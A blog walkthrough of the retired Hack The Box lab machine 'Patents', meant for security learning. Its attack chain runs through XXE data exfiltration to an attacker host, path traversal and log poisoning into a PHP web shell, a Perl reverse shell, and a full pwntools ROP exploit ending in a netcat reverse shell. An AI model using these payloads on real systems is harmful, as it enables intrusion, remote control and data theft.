---
layout: post
title: "Patents: Hack The Box Walkthrough"
date: 2020-05-17 15:14:54 +0000
last_modified_at: 2020-05-17 15:14:54 +0000
category: Walkthrough
tags: ["Hack The Box", Patents, retired, Linux]
comments: true
image:
  feature: patents-htb-walkthrough.png
---

This post documents the complete walkthrough of Patents, a retired vulnerable [VM][1] created by [gbyolo][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Patents is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.173 --rate=700

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-20 02:12:39 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.173
Discovered open port 80/tcp on 10.10.10.173
Discovered open port 8888/tcp on 10.10.10.173
```

Other than the usual ports, port `8888/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,8888 -A --reason 10.10.10.173 -oN nmap.txt
...
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 39:b6:84:a7:a7:f3:c2:4f:38:db:fc:2a:dd:26:4e:67 (RSA)
|   256 b1:cd:18:c7:1d:df:57:c1:d2:61:31:89:9e:11:f5:65 (ECDSA)
|_  256 73:37:88:6a:2e:b8:01:4e:65:f7:f8:5e:47:f6:10:c4 (ED25519)
80/tcp   open  http            syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 57E2685CB1CD9B0F1ADA444F3CFF20C6
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: MEOW Inc. - Patents Management
8888/tcp open  sun-answerbook? syn-ack ttl 63
| fingerprint-strings:
|   Help, LPDString, LSCP:
|_    LFM 400 BAD REQUEST
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.80%I=7%D=1/21%Time=5E269A82%P=x86_64-pc-linux-gnu%r(LS
SF:CP,17,"LFM\x20400\x20BAD\x20REQUEST\r\n\r\n")%r(Help,17,"LFM\x20400\x20
SF:BAD\x20REQUEST\r\n\r\n")%r(LPDString,17,"LFM\x20400\x20BAD\x20REQUEST\r
SF:\n\r\n");
```

Hmm. `nmap` is not saying much on the mysterious open port. Anyway, this is how the site looks like.

{% include image.html image_alt="84ec8583.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/84ec8583.png" %}

### Directory/File Enumeration

Let's see what we can glean from `wfuzz` and `quickhits.txt` from SecLists.

```
# wfuzz -w quickhits.txt -t 100 --hc '403,404' http://10.10.10.173/FUZZ
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.173/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000071:   200        7 L      28 W     6148 Ch     "/.DS_Store"
000000934:   200        1 L      0 W      1 Ch        "/config.php"
000002261:   200        120 L    353 W    5528 Ch     "/upload.html"
000002262:   200        16 L     73 W     589 Ch      "/upload.php"

Total time: 9.380824
Processed Requests: 2439
Filtered Requests: 2435
Requests/sec.: 259.9984
```

Hmm, `.DS_Store`. Someone is using Mac? Anyways, looks like we have two versions of an uploading feature.

_upload.html_

{% include image.html image_alt="e70ccd2b.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/e70ccd2b.png" %}

_upload.php_

{% include image.html image_alt="96ab1ac9.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/96ab1ac9.png" %}

Having said that, both files are pointing to the same `convert.php`.

_upload.html_

{% include image.html image_alt="ba1c6ded.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/ba1c6ded.png" %}

_upload.php_

{% include image.html image_alt="34eddd4f.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/34eddd4f.png" %}

Let's switch gears to another wordlist and see what we can discover this time.

```
# wfuzz -w common.txt -t 100 --hc '403,404' http://10.10.10.173/FUZZ
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.173/FUZZ
Total requests: 4652

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000002148:   200        340 L    770 W    12548 Ch    "index"
000002150:   200        340 L    770 W    12548 Ch    "index.html"
000002913:   301        9 L      28 W     313 Ch      "output"
000002971:   301        9 L      28 W     314 Ch      "patents"
000003251:   200        437 L    986 W    16064 Ch    "profile"
000003428:   301        9 L      28 W     314 Ch      "release"
000003894:   301        9 L      28 W     313 Ch      "static"
000004243:   200        120 L    353 W    5528 Ch     "upload"
000004252:   301        9 L      28 W     314 Ch      "uploads"
000004320:   301        9 L      28 W     313 Ch      "vendor"

Total time: 13.41015
Processed Requests: 4652
Filtered Requests: 4642
Requests/sec.: 346.9012
```

Ok. This time round we have some directories (the 301s). Let's try `quickhits.txt` on `/vendor`.

```
# wfuzz -w quickhits.txt -t 100 --hc '403,404' http://10.10.10.173/vendor/FUZZ
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.173/vendor/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000900:   200        848 L    1549 W   26980 Ch    "/composer/installed.json"

Total time: 10.21482
Processed Requests: 2439
Filtered Requests: 2438
Requests/sec.: 238.7706
```

Interesting. What have we here? Composer is used and `installed.json` contains the external PHP packages installed.

```
# curl -s http://10.10.10.173/vendor/composer/installed.json | jq '.[] | {name}' | tr -d '{}' | sed -r '/^$/d' | cut -d':' -f2 | tr -d '" '
gears/di
gears/pdf
gears/string
google/apiclient
icecave/parity
icecave/repr
ircmaxell/password-compat
jakoch/phantomjs-installer
paragonie/random_compat
symfony/filesystem
symfony/intl
symfony/polyfill
symfony/polyfill-ctype
symfony/process
voku/portable-utf8
```

Long story short, a hint from the creator was needed to get that initial foothold.

{% include image.html image_alt="052dedae.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/052dedae.png" %}

After testing several wordlists from the `raft` series in SecLists, I managed to stumble upon the right one.

```
# wfuzz -w raft-large-words.txt -t 100 --hc '403,404' http://10.10.10.173/release/FUZZ
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.173/release/FUZZ
Total requests: 119600

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000076827:   200        17 L     104 W    758 Ch      "UpdateDetails"

Total time: 342.9610
Processed Requests: 119600
Filtered Requests: 119599
Requests/sec.: 348.7276
```

{% include image.html image_alt="aeb6c549.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/aeb6c549.png" %}

Something about entity parsing in the custom folder caught my eye. If I had to guess, I would say it means that XXE injection is possible in Microsoft Office Word's custom XML.

### XXE Injection

Let's give it a shot. Here's my game plan.

1. First, we create an empty DOCX file with a custom XML part. Note that the XML must be valid.
2. Inject XXE payload.
3. Upload to test.
4. Repeat step 2 for different payloads.

#### Create DOCX file with custom XML part

Easy. Refer to this [video](https://www.youtube.com/watch?v=OrriThs7m1s).

#### XXE payload

You can see that a **customXml** folder is present in the DOCX file.

{% include image.html image_alt="13d95279.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/13d95279.png" %}

Extract it out like so.

```
# 7z e test.docx customXml
```

Inject a XXE payload with a text editor.

```
# vi customXml/item1.xml
```

{% include image.html image_alt="0a49240c.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/0a49240c.png" %}

Update the DOCX file with the changes.

```
# zip -u test.docx -r customXml/
```

#### Upload to test

What you see above is the blind XXE where we try to load a remote resource. In our case, that remote resource is from my SimpleHTTPServer. The objective is to see if we are able to solicit any kind of response from the server.

{% include image.html image_alt="f765c072.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/f765c072.png" %}

Awesome.

#### XXE OOB with DTD and PHP filter

Now, let's move on to the next payload: XXE OOB with DTD and PHP filter.

{% include image.html image_alt="9eae707d.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/9eae707d.png" %}

<div class="filename"><span>dtd.xml</span></div>

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.75/dtd.xml?%data;'>">
```

See what's displayed on my SimpleHTTPServer.

```
# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.173 - - [25/Jan/2020 05:46:26] "GET /dtd.xml HTTP/1.0" 200 -
10.10.10.173 - - [25/Jan/2020 05:46:26] "GET /dtd.xml?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK HTTP/1.0" 200 -
```

`base64`-encoded `/etc/passwd` from the server, which is decoded to:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
gbyolo:x:1000:1000::/home/gbyolo:/bin/bash
```

With that in mind, let's write a simple shell script to exfiltrate any file we have read permissions on. Notice I'm chaining PHP filters to reduce the size.

<div class="filename"><span>exfil.sh</span></div>

```shell
#!/bin/bash

HOST=10.10.10.173
URL="http://$HOST/convert.php"
FILE=$1

cat <<EOF > dtd.xml
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=$FILE">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.75/dtd.xml?%data;'>">
EOF

curl -s \
     -H "Expect: " \
     -F "userfile=@test.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
     -F "submit=Generate pdf" \
     -o /dev/null \
     $URL
```

I'm also piping my SimpleHTTPServer output to the following to display only the pertinent information.

```
# python -m SimpleHTTPServer 80 2>&1 | stdbuf -o0 grep -Eo 'dtd\.xml\?.* ' | stdbuf -o0 cut -d' ' -f1 | stdbuf -o0 cut -c9-
```

Let's exfiltrate `config.php`.

{% include image.html image_alt="fef9364b.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/fef9364b.png" %}

Here, I'm using CyberChef to reconstruct the actual file back. Looks like we have a purposely-named file that prevents discovery by any wordlists.

<div class="filename"><span>getPatent_alphav1.0.php</span></div>

~~~~html
<?php

//error_reporting(E_ALL);
//ini_set('display_errors', 1);
//header("Content-type: text/plain");

require __DIR__ . '/vendor/autoload.php';

include('config.php');

use Gears;

$uploaddir = 'uploads/';

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
        <link rel="shortcut icon" type="image/x-icon" href="static/assets/img/favicon.png">
        <title>Upload - MEOW Inc. - Patents Management Management</title>
		<link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500,600,700" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="static/assets/css/bootstrap.min.css">
		<link rel="stylesheet" type="text/css" href="static/assets/css/line-awesome.min.css">
		<link rel="stylesheet" type="text/css" href="static/assets/css/dataTables.bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="static/assets/css/font-awesome.min.css">
        <link rel="stylesheet" type="text/css" href="static/assets/css/style.css">
		<!--[if lt IE 9]>
			<script src="static/assets/js/html5shiv.min.js"></script>
			<script src="static/assets/js/respond.min.js"></script>
		<![endif]-->
    </head>
    <body>
        <div class="main-wrapper">
            <div class="header">
                <div class="header-left">
                    <a href="index.html" class="logo">
						<img src="static/assets/img/logo.png" width="50" height="50" alt="">
					</a>
                </div>
				<a id="toggle_btn" href="javascript:void(0);"><i class="la la-bars"></i></a>
                <div class="page-title-box pull-left">
					<h3>MEOW Inc. - Patents Management</h3>
                </div>
				<a id="mobile_btn" class="mobile_btn pull-left" href="#sidebar"><i class="fa fa-bars" aria-hidden="true"></i></a>
				<ul class="nav navbar-nav navbar-right user-menu pull-right">
					<li class="dropdown">
						<a href="profile.html" class="dropdown-toggle user-link" data-toggle="dropdown" title="Admin">
							<span class="user-img"><img class="img-circle" src="static/assets/img/user.jpg" width="40" alt="Admin">
							<span class="status online"></span></span>
							<span>Ajeje Brazorf</span>
							<i class="caret"></i>
						</a>
						<ul class="dropdown-menu">
							<li><a href="profile.html">My Profile</a></li>
							<li><a href="edit-profile.html">Edit Profile</a></li>
						</ul>
					</li>
				</ul>
				<div class="dropdown mobile-user-menu pull-right">
					<a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false"><i class="fa fa-ellipsis-v"></i></a>
					<ul class="dropdown-menu pull-right">
						<li><a href="profile.html">My Profile</a></li>
						<li><a href="edit-profile.html">Edit Profile</a></li>
					</ul>
				</div>
            </div>
            <div class="sidebar" id="sidebar">
                <div class="sidebar-inner slimscroll">
					<div id="sidebar-menu" class="sidebar-menu">
						<ul>
							<li class="submenu">
								<a href="#" class="noti-dot"><i class="la la-user"></i> <span> Patents</span> <span class="menu-arrow"></span></a>
								<ul style="display: none;">
									<li><a href="index.html">All Patents</a></li>
									<li><a href="upload.html">Upload patent</a></li>
								</ul>
							</li>
						</ul>
					</div>
                </div>
            </div>
            <div class="page-wrapper">
                <div class="content container-fluid center">
                	<div class="row">
                		<div class="col-sm-8">
                			<h4 class="page-title">Read a patent</h4>
                		</div>
                	</div>
                	<div class="row">
                		<div class="col">
                			<span></span>
                		</div>
                	</div>
                	<div class="row">
                		<div class="col">
                			<span>Here you can read submitted patents. Being it an experimental feature yet, read your patents using <pre>?id=#ID_OF_YOUR_PATENT.</pre></span>
                		</div>
                	</div>

						<?php
							if (isset($_GET["id"])) {
							    $id = $_GET["id"];
							    $file = str_replace("../","",PATENTS_DIR . $id);  
							    echo "<div class=\"row mt-3\"> <div class=\"col\">";
						            echo "<span>ID: $id</span></div> <div class=\"col\">";
							    echo " <pre>";
							    include(__DIR__ . $file);
							    echo "</pre></div></div>";
							}
						?>
                </div>
            </div>
        </div>
		<div class="sidebar-overlay" data-reff="#sidebar"></div>
        <script type="text/javascript" src="static/assets/js/jquery-3.2.1.min.js"></script>
        <script type="text/javascript" src="static/assets/js/bootstrap.min.js"></script>
		<script type="text/javascript" src="static/assets/js/jquery.dataTables.min.js"></script>
		<script type="text/javascript" src="static/assets/js/dataTables.bootstrap.min.js"></script>
		<script type="text/javascript" src="static/assets/js/jquery.slimscroll.js"></script>
		<script type="text/javascript" src="static/assets/js/app.js"></script>
    </body>
</html>
~~~~

### Directory Traversal and Local File Inclusion Vulnerability

Looks like there's a directory traversal and LFI vulnerability with the `id` parameter in `getPatent_alphav1.0.php`. After all, `gbyolo` is right to say that `str_replace` is not a real fix. Armed with this insight, let's write another shell script to exploit the LFI vulnerability to read files.

<div class="filename"><span>lfi.sh</span></div>

```shell
#!/bin/bash

HOST=10.10.10.173
FILE=$1
URL="http://$HOST/getPatent_alphav1.0.php?id=....//....//....//....//....//$FILE"

curl -s \
     $URL \
| sed '/<pre>/,/<\/pre>/!d' \
| sed 1,4d \
| xmllint --recover --xpath "//pre" - 2>/dev/null \
| sed -r 's/<\/?pre\/?>//g'
```

Notice how I was able to bypass `str_replace()` to achieve directory traversal? Now, let's see if we can access files that will allow log poisoning later on. For brevity's sake, I was able to access `/var/log/apache/error.log` for log poisoning.

I poisoned it with the following command:

```
# curl -H "Referer: <?php phpinfo(); ?>" http://10.10.10.173/dipshit.php
```

And you should get something like this.

{% include image.html image_alt="0297e8d4.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/0297e8d4.png" %}

### Remote Command Execution

Next up, let's see if we can get remote command execution from log poisoning with the following:

```
# curl -H "Referer: <style type='text/css'>body { background-color: black; } #dipshit { background-color: white; color: black; }</style><div id='dipshit'><pre><?php echo shell_exec(\$_GET[0]); ?></pre></div>" http://10.10.10.173/dipshit.php
```

If everything went well, we should see something like this responding to the following URL.

```
http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....///var/log/apache2/error.log&0=id
```

{% include image.html image_alt="6c1433b2.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/6c1433b2.png" %}


## Low-Privileged Shell

Time to get that shell with a Perl one-liner.

```
perl -e 'use Socket;$i="10.10.14.75";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

{% include image.html image_alt="f47e8722.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/f47e8722.png" %}

Finally but the euphoria didn't last long because the `user.txt` is held by `root` and the web server is hosted in a docker container.

{% include image.html image_alt="3a884cb9.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/3a884cb9.png" %}

Which means that we need to find the `root`'s password on this docker container. :angry:

### Process monitoring with `pspy64`

{% include image.html image_alt="f9a3325c.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/f9a3325c.png" %}

Hmm. `gbyolo` is not as security conscious as we thought! Armed with the `root`'s password (`!gby0l0r0ck$$!`), we can easily get `user.txt`.

{% include image.html image_alt="57f5df5a.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/57f5df5a.png" %}

## Privilege Escalation

At long last we have some information about the mysterious open port `8888/tcp`, other than getting **"LFM 400 BAD REQUEST"** with everything thrown at it.

<div class="filename"><span>checker.py</span></div>

~~~~python
#!/usr/bin/env python
import sys
import os
from utils import md5,recvline
import socket

INPUTREQ = "CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"

if len(sys.argv) != 5:
    print "Usage: " + sys.argv[0] + " <host>:<port> <user> <pass> <file>"
    exit(-1)

HOST = sys.argv[1]
var = HOST.split(":")

if len(var) != 2:
    print "Usage: " + sys.argv[0] + " <host>:<port> <user> <pass> <file>"
    exit(-1)

try:
    PORT = int(var[1])
except ValueError:
    print "Port number must be integer"
    exit(-1)

HOST = var[0]

#print "Connecting to " + HOST + ":" + str(PORT)

USER = sys.argv[2]

try:
    PASS = os.environ[sys.argv[3]]
except KeyError:
    print "Couldn't find such password"
    exit(-1)

FILE = sys.argv[4]

# At this point PASS is well-defined
base = os.path.basename(FILE)

try:
    md5sum = md5(FILE)
except IOError:
    print "File not found locally"
    exit(-1)

REALREQ = INPUTREQ.format(base, USER, PASS, md5sum)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
s.sendall(REALREQ)
resp = s.recv(4096)
s.close()

#print resp

if "LFM 200 OK" in resp:
    #print "File OK, no need to download"
    exit(0)

if "404" in resp:
    print "File not found on server"
    exit(-1)

#print "File corrupted, need to download it"

REQ = "GET /{} LFM\r\n\r\n".format(base)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(REQ)
recvline(s)
recvline(s)
recvline(s)
resp = s.recv(8192)

#if resp[-1] == '\n':
#    resp = resp[:-1]
#
#if resp[-1] == '\r':
#    resp = resp[:-1]

s.close()

with open("{}.new".format(base), "wb") as f:
    f.write(resp)

print "{}.new".format(base)
~~~~

### Lightweight File Manager LFM Protocol

On top of that, during enumeration of `gbyolo`'s account, I notice the git repository to `lfmserver`'s source code.

{% include image.html image_alt="e61c4d54.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/e61c4d54.png" %}

Here's some of the commit logs.

{% include image.html image_alt="4340f9bb.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/4340f9bb.png" %}

Checking out commit `1bbc51851` reveals the protocol.

{% include image.html image_alt="aeb7d0a7.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/aeb7d0a7.png" %}

### Vulnerability Analysis of `lfmserver`

From the README above, it's evident that if we are to exploit the LFM protocol, it must have something to do with the input, and we have three methods to play with, namely, CHECK, GET and PUT. However, looking at the source code for the LFM protocol implementation, we can't find the handler for the respective methods.

{% include image.html image_alt="a38cb37d.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/a38cb37d.png" %}

Fret not. We have `lfmserver`; we can reverse-engineer the handlers. Long story short, the vulnerability lies in the `handle_check` function.

{% include image.html image_alt="8e42b573.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/8e42b573.png" %}

This is where (in `handle_lfm_connection`) we call the `handle_check` function. Right after we enter the function, we have a 160-byte buffer for storing the file path after URL decoding. I smell buffer overflow!

{% include image.html image_alt="c870d2be.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/c870d2be.png" %}

#### Controlling the offset to the return address

Here, I was able to control the offset to the return address with this little test script.

<div class="filename"><span>test.sh</span></div>

~~~~shell
#!/bin/bash

HOST="127.0.0.1"
PORT="8888"
USER="lfmserver_user"
PASS='!gby0l0r0ck$$!'
FILE=$1
TRAV="%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"
MD5="$(md5sum $FILE | cut -d' ' -f1)"
PAY="$(perl -e 'print "A" x 107 . "B" x 6' | xxd -p | tr -d '\n' | sed -r 's/(..)/%\1/g')"

echo -ne "CHECK /${TRAV}${FILE}%00${PAY} LFM\r\nUSER=$USER\r\nPASSWORD=$PASS\r\n\r\n$MD5\n" \
| nc $HOST $PORT
~~~~

{% include image.html image_alt="4ffcb54e.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/4ffcb54e.png" %}

### Exploit Development of `lfmserver`

Before we go on, there's an important information in commit `a900ccf7` about the `libc(7)` used in compiling `lfmserver`. You can download it from [here](https://libc.blukat.me/d/libc6_2.28-0ubuntu1_amd64.so).

{% include image.html image_alt="aaf5fb40.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/aaf5fb40.png" %}

We can build upon our test script to develop an actual exploit for `lfmserver` with pwntools. Here's my exploit code.

<div class="filename"><span>exploit.py</span></div>

~~~~python
from pwn import *

# Context
context.binary = "./lfmserver"
libc = ELF("./libc.so.6")

# Connection information
host = "10.10.10.173"
port = 8888

# LFM authentication / md5sum
user      = "lfmserver_user"
password  = "!gby0l0r0ck$$!"
guarantee = "/proc/sys/kernel/randomize_va_space" # guaranteed to be same on both sides; ASLR is enabled
md5sum    = "26ab0db90d72e28ad0ba1e22ee510510"    # md5sum("/proc/sys/kernel/randomize_va_space")

def encode(string):
    return ''.join("%%%02x" % ord(c) for c in string)

def genrequest(payload):
	traversal     = "../../../../../.."
	offset_to_ret = "A" * 107

	filepath  = encode(traversal)
	filepath += guarantee + "%00"
	filepath += encode(offset_to_ret)
	filepath += encode(payload)

	request = "CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n".format(filepath, user, password, md5sum)
	return request

# ROPgadget --binary lfmserver
'''
0x0000000000405c4b : pop rdi ; ret
0x0000000000405c49 : pop rsi ; pop r15 ; ret
'''
pop_rdi_ret     = 0x405c4b
pop_rsi_pop_ret = 0x405c49
skip            = 0xdeadbeef

# Leak libc
r = remote(host, port)

rop  = ""
rop += p64(pop_rdi_ret)
rop += p64(6)
rop += p64(pop_rsi_pop_ret)
rop += p64(context.binary.got["dup2"])
rop += p64(skip)
rop += p64(context.binary.symbols["write"])

r.sendline(genrequest(rop))

leaked = r.recvall().split('\n')[4][1:7]
leaked = unpack(leaked, 48)
libc.address = leaked - libc.symbols["dup2"]

success("libc base: %s" % hex(libc.address))

# Time for shell
r = remote(host, port)

# dup2(6, 0), dup2(6, 1), dup2(6, 2)
payload = ""
for fd in range(3):
	payload += p64(pop_rdi_ret)
	payload += p64(6)
	payload += p64(pop_rsi_pop_ret)
	payload += p64(fd)
	payload += p64(skip)
	payload += p64(libc.symbols["dup2"])

# one_gadget libc.so.6
'''
0x50186 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x501e3 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x103f50 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
payload += p64(libc.address + 0x501e3) # found to work from trial-n-error

r.sendline(genrequest(payload))
r.sendline("rm -rf /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | nc 10.10.15.188 1234 >/tmp/p")
~~~~

Let's give it a shot. We need to set up a `nc` listener by the way because our payload is a reverse shell.

{% include image.html image_alt="f5280d62.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/f5280d62.png" %}

Awesome.

### Getting `root.txt`

I got kicked hard in the nuts, this one. I ran all the docker images including the hidden ones thinking that `root.txt` in one of them. Boy, was I wrong! In the end, the real `/root` mount point was hidden from me because of the Linux filesystem hierarchy.

{% include image.html image_alt="e66c9d7b.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/e66c9d7b.png" %}

See? If I navigate to `/root`, I'm actually looking at `/dev/sdb1`. So, in order to get to `/dev/sda2` mounted at `/`, I can mount `/dev/sda2` at another location, e.g. `/tmp/gbyolo`.

{% include image.html image_alt="8b7e08fc.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/8b7e08fc.png" %}

With that, getting `root.txt` is easy.

{% include image.html image_alt="8056b110.png" image_src="/ab168b60-50ed-4c06-a675-54c1149e2c93/8056b110.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/224
[2]: https://www.hackthebox.eu/home/users/profile/36994
[3]: https://www.hackthebox.eu/
